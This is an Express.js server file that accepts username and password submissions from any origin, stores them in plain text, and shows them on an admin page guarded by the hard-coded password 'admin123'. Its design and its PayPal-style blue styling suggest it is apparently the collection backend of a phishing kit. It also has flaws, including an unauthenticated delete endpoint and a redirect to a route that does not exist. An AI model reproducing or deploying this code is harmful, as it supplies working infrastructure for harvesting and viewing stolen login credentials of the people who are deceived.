const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'user_data.txt');
const ADMIN_PASSWORD = 'admin123'; // Change this to a secure password in production

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

// Store submissions
let submissions = [];

try {
    if (fs.existsSync(DATA_FILE)) {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        submissions = JSON.parse(data);
    }
} catch (error) {
    console.error('Error loading initial data:', error);
}

// POST endpoint to receive form data
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const submission = {
        id: Date.now().toString(), // Unique ID for each record
        username,
        password,
        timestamp: new Date().toISOString()
    };

    submissions.push(submission);

    fs.writeFile(DATA_FILE, JSON.stringify(submissions, null, 2), (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).json({ success: false, message: 'Server error' });
        }
        res.json({ success: true });
    });
});

// Login page
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
                input { padding: 8px; margin: 10px; }
                button { padding: 8px 16px; background: #0070ba; color: white; border: none; cursor: pointer; }
                .error { color: red; display: none; }
            </style>
        </head>
        <body>
            <h1>Admin Login</h1>
            <form action="/records" method="POST">
                <input type="password" name="adminPassword" placeholder="Enter admin password">
                <button type="submit">Login</button>
            </form>
            <div id="error" class="error">Incorrect password</div>
        </body>
        </html>
    `);
});

// Records page
app.post('/records', (req, res) => {
    const { adminPassword } = req.body;
    
    if (adminPassword !== ADMIN_PASSWORD) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Admin Login</title>
            <style>body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
            input { padding: 8px; margin: 10px; }
            button { padding: 8px 16px; background: #0070ba; color: white; border: none; cursor: pointer; }
            .error { color: red; }</style></head>
            <body><h1>Admin Login</h1>
            <form action="/records" method="POST">
                <input type="password" name="adminPassword" placeholder="Enter admin password">
                <button type="submit">Login</button>
            </form>
            <div class="error">Incorrect password</div>
            </body></html>
        `);
    }

    let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Records</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
                table { border-collapse: collapse; width: 100%; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
                th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
                th { background: #0070ba; color: white; }
                tr:nth-child(even) { background: #f9f9f9; }
                .delete-btn { background: #dc3545; color: white; border: none; padding: 6px 12px; cursor: pointer; border-radius: 4px; }
                .delete-btn:hover { background: #c82333; }
            </style>
        </head>
        <body>
            <h1>Records</h1>
            <table>
                <tr>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Timestamp</th>
                    <th>Action</th>
                </tr>
    `;

    submissions.forEach(submission => {
        html += `
            <tr>
                <td>${escapeHtml(submission.username)}</td>
                <td>${escapeHtml(submission.password)}</td>
                <td>${submission.timestamp}</td>
                <td>
                    <form action="/delete" method="POST">
                        <input type="hidden" name="id" value="${submission.id}">
                        <button type="submit" class="delete-btn">Delete</button>
                    </form>
                </td>
            </tr>
        `;
    });

    html += `
            </table>
        </body>
        </html>
    `;

    res.send(html);
});

// Delete endpoint
app.post('/delete', (req, res) => {
    const { id } = req.body;
    
    submissions = submissions.filter(submission => submission.id !== id);
    
    fs.writeFile(DATA_FILE, JSON.stringify(submissions, null, 2), (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).send('Error deleting record');
        }
        res.redirect('/records'); // This will trigger login again
    });
});

// HTML escape function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
